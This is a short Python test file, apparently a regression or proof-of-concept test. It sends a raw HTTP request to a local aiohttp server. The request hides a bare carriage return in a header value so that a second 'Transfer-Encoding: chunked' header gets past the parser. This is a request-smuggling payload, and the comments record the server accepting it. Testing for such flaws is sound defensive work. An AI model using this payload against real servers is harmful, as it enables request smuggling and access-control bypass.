import socket


def test_basic_import_attack_payload():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("localhost", 8080))
    sock.send(
        b"POST / HTTP/1.1\r\nHost: localhost:8080\r\nX-Abc: \rxTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n"
    )
    response = sock.recv(4096)
    # Response should look something like this:
    # HTTP/1.1 200 OK
    # Content-Type: text/plain; charset=utf-8
    # Content-Length: 91
    # Date: Mon, 27 May 2024 14:56:56 GMT
    # Server: Python/3.8 aiohttp/3.8.4

    # headers: {'Host': 'localhost:8080', 'X-Abc': '', 'Transfer-Encoding': 'chunked'} body: b'A'
    assert response.decode().startswith("HTTP/1.1 200 OK")
    assert (
        "headers: {'Host': 'localhost:8080', 'X-Abc': '', 'Transfer-Encoding': 'chunked'} body: b'A'"
        in response.decode()
    )
    sock.close()
